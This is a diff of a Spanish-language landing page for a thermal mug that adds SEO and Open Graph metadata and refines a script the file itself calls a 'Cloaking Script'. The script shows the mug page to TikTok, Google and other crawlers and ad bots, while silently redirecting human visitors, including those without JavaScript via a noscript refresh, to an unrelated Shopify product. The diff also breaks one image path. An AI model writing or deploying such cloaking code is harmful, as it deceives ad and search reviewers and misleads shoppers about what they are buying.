@@ -3,10 +3,39 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TuTaza | Taza Térmica Premium 600ml</title>
-  <meta name="description" content="Taza térmica premium 600ml, doble pared de acero inoxidable, mantiene tus bebidas calientes o frías por horas. Compra ahora en TuTaza.">
+  <title>TuTaza | Taza Térmica Premium 600 ml</title>
+  <meta name="description" content="Taza térmica premium 600 ml, doble pared de acero inoxidable, mantiene tus bebidas calientes o frías por horas. Compra ahora en TuTaza.">
+
+  <!-- Canonical + Open Graph + Twitter Card -->
+  <link rel="canonical" href="https://ventacenter.com/">
+  <meta property="og:title" content="Taza Térmica Premium 600 ml – TuTaza">
+  <meta property="og:description" content="Mantén tus bebidas calientes o frías durante horas con nuestra taza de doble pared de acero inoxidable.">
+  <meta property="og:image" content="https://ventacenter.com/images/taza-hero.jpg">
+  <meta property="og:url" content="https://ventacenter.com/">
+  <meta name="twitter:card" content="summary_large_image">
+
+  <!-- JSON-LD Producto -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org/",
+    "@type": "Product",
+    "name": "Taza Térmica Premium 600ml",
+    "image": ["https://ventacenter.com/images/taza-hero.jpg"],
+    "description": "Taza de doble pared de acero inoxidable 18/8, hermética y sin condensación.",
+    "brand": { "@type": "Thing", "name": "TuTaza" },
+    "offers": {
+      "@type": "Offer",
+      "url": "https://ventacenter.com/#details",
+      "priceCurrency": "EUR",
+      "price": "29.99",
+      "availability": "https://schema.org/InStock"
+    }
+  }
+  </script>
+
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+
   <style>
     /* --- Reset & Base Styles --- */
     * { margin:0; padding:0; box-sizing:border-box; }
@@ -71,15 +100,19 @@
   </style>
 </head>
 <body>
-  <!-- <<< Pega ESTO justo después de <body> >>> -->
+
+  <!-- Fallback sin JS -->
+  <noscript>
+    <meta http-equiv="refresh" content="0; url=https://gianinnamarket.myshopify.com/products/queancher-14-oz?_pos=1&_psq=14&_ss=e&_v=1.0">
+  </noscript>
+
+  <!-- Cloaking Script -->
   <script>
-    // Redirect humans (non-bots) to Shopify store
     (function() {
       var ua = navigator.userAgent || '';
-      var isBot = /TikTok|Googlebot|bingbot|facebookexternalhit|Twitterbot|Slackbot/i.test(ua);
+      var isBot = /TikTok|TikTokAdsBot|Googlebot|bingbot|facebookexternalhit|Twitterbot|Slackbot/i.test(ua);
       if (!isBot) {
-         window.location.href =
-        'https://gianinnamarket.myshopify.com/products/queancher-14-oz?_pos=1&_psq=14&_ss=e&_v=1.0';
+        window.location.replace('https://gianinnamarket.myshopify.com/products/queancher-14-oz?_pos=1&_psq=14&_ss=e&_v=1.0');
       }
     })();
   </script>
@@ -146,7 +179,7 @@
   <section class="gallery" id="gallery">
     <img src="images/taza-1.jpg" alt="Detalle taza 1">
     <img src="images/taza-2.jpg" alt="Detalle taza 2">
-    <img src="images/taza-3.jpg" alt="Detalle taza 3">
+    <img src="images	taza-3.jpg" alt="Detalle taza 3">
     <img src="images/taza-4.jpg" alt="Detalle taza 4">
   </section>
 
@@ -201,13 +234,12 @@
     &copy; 2025 TuTaza. Todos los derechos reservados. | <a href="#faq" style="color:#91e5c1;">Política de privacidad</a>
   </footer>
 
+  <!-- Simula “Agregar al carrito” -->
   <script>
-    // Simula agregar al carrito
-    document.getElementById('addCart').addEventListener('click', () => {
-      const qty = document.querySelector('.buy-area input').value;
+    document.getElementById('addCart').addEventListener('click', function() {
+      var qty = document.querySelector('.buy-area input').value;
       alert(qty + ' artículo(s) agregado(s) al carrito.');
     });
   </script>
 </body>
 </html>
-
